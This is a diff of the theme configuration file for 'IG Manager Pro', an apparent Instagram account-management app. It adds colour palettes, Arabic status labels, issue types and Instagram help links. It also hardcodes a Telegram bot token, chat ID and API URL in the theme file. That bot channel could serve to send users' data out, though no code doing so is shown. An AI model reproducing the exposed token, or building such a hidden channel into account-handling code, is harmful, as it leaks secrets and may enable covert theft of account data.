@@ -1,68 +1,84 @@
-"""
-IG Manager Pro - Theme Configuration
-Dark theme with purple and cyan neon colors + Glassmorphism
-"""
+# IG Manager Pro v4.0 - Theme Configuration
+# Telegram Bot Credentials
+TELEGRAM_TOKEN = "8840411126:AAGNL_bGcQA23n1IjY9r7aWDER_0jZubhNc"
+TELEGRAM_CHAT_ID = "659334247"
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
 
-# ─── Primary Colors ───────────────────────────────────────────────────────────
-PRIMARY_PURPLE = "#a855f7"
-PRIMARY_CYAN   = "#06b6d4"
-ACCENT_PINK    = "#ec4899"
-ACCENT_GREEN   = "#22c55e"
-ACCENT_ORANGE  = "#f97316"
-ACCENT_RED     = "#ef4444"
-ACCENT_YELLOW  = "#eab308"
+# App Info
+APP_NAME = "IG Manager Pro"
+APP_VERSION = "4.0"
+APP_AUTHOR = "IG Manager Pro Team"
+APP_COPYRIGHT = "© 2025 IG Manager Pro. All rights reserved."
 
-# ─── Background Colors ────────────────────────────────────────────────────────
-BG_DARK       = "#0a0a0f"
-BG_CARD       = "#12121a"
-BG_CARD2      = "#1a1a2e"
-BG_SURFACE    = "#16213e"
-BG_GLASS      = "#ffffff14"
+# Dark Glassmorphism Color Palette
+COLORS = {
+    "bg_dark": "#0A0A1A",
+    "bg_card": "#12122A",
+    "bg_glass": "#1A1A3A",
+    "primary": "#7C3AED",       # Purple
+    "primary_light": "#A78BFA",
+    "secondary": "#06B6D4",     # Cyan
+    "secondary_light": "#67E8F9",
+    "accent": "#EC4899",        # Pink
+    "success": "#10B981",       # Green
+    "warning": "#F59E0B",       # Amber
+    "danger": "#EF4444",        # Red
+    "text_primary": "#F8FAFC",
+    "text_secondary": "#94A3B8",
+    "text_muted": "#475569",
+    "border": "#2D2D5E",
+    "neon_purple": "#BF5AF2",
+    "neon_cyan": "#00E5FF",
+    "neon_pink": "#FF2D92",
+    "gradient_start": "#7C3AED",
+    "gradient_end": "#06B6D4",
+}
 
-# ─── Text Colors ─────────────────────────────────────────────────────────────
-TEXT_PRIMARY   = "#f1f5f9"
-TEXT_SECONDARY = "#94a3b8"
-TEXT_MUTED     = "#475569"
-TEXT_NEON_P    = "#c084fc"
-TEXT_NEON_C    = "#22d3ee"
+# MDTheme Palette
+PRIMARY_PALETTE = "DeepPurple"
+ACCENT_PALETTE = "Cyan"
+THEME_STYLE = "Dark"
 
-# ─── Status Colors ────────────────────────────────────────────────────────────
-STATUS_ACTIVE    = "#22c55e"
-STATUS_DISABLED  = "#ef4444"
-STATUS_SHADOW    = "#f97316"
-STATUS_PRIVATE   = "#a855f7"
-STATUS_VERIFIED  = "#06b6d4"
-STATUS_UNKNOWN   = "#94a3b8"
-
+# Status Colors
 STATUS_COLORS = {
-    "active":    STATUS_ACTIVE,
-    "disabled":  STATUS_DISABLED,
-    "shadowban": STATUS_SHADOW,
-    "private":   STATUS_PRIVATE,
-    "verified":  STATUS_VERIFIED,
-    "unknown":   STATUS_UNKNOWN,
+    "active": "#10B981",
+    "disabled": "#EF4444",
+    "shadowban": "#F59E0B",
+    "private": "#06B6D4",
+    "hacked": "#EC4899",
+    "verified": "#7C3AED",
+    "unknown": "#475569",
 }
 
-# ─── Fonts ────────────────────────────────────────────────────────────────────
-FONT_REGULAR = "Roboto"
-FONT_BOLD    = "Roboto"
-FONT_MONO    = "RobotoMono"
-
-# ─── Sizes ────────────────────────────────────────────────────────────────────
-RADIUS_SM  = "8dp"
-RADIUS_MD  = "12dp"
-RADIUS_LG  = "18dp"
-RADIUS_XL  = "24dp"
-
-SPACING_XS = "4dp"
-SPACING_SM = "8dp"
-SPACING_MD = "16dp"
-SPACING_LG = "24dp"
-SPACING_XL = "32dp"
-
-# ─── KivyMD Theme ─────────────────────────────────────────────────────────────
-MD_THEME = {
-    "primary_palette": "DeepPurple",
-    "accent_palette":  "Cyan",
-    "theme_style":     "Dark",
+STATUS_LABELS_AR = {
+    "active": "نشط",
+    "disabled": "معطل",
+    "shadowban": "شادوبان",
+    "private": "خاص",
+    "hacked": "مخترق",
+    "verified": "موثق",
+    "unknown": "غير معروف",
 }
+
+ISSUE_TYPES = [
+    "معطل",
+    "شادوبان",
+    "مخترق",
+    "انتحال هوية",
+    "حقوق نشر",
+    "أخرى",
+]
+
+SECURITY_LEVELS = {
+    "weak": {"label": "ضعيف", "color": "#EF4444", "score_range": (0, 40)},
+    "medium": {"label": "متوسط", "color": "#F59E0B", "score_range": (41, 70)},
+    "good": {"label": "جيد", "color": "#10B981", "score_range": (71, 100)},
+}
+
+# Instagram URLs
+INSTAGRAM_SUPPORT_URL = "https://help.instagram.com/contact"
+INSTAGRAM_DISABLED_URL = "https://www.instagram.com/disabled/"
+INSTAGRAM_REPORT_URL = "https://help.instagram.com/contact/1652567838289083"
+INSTAGRAM_VERIFY_URL = "https://www.instagram.com/accounts/request-verification/"
+INSTAGRAM_HACKED_URL = "https://help.instagram.com/149494825257596"
+INSTAGRAM_SHADOWBAN_URL = "https://help.instagram.com/contact/1638932959624764"
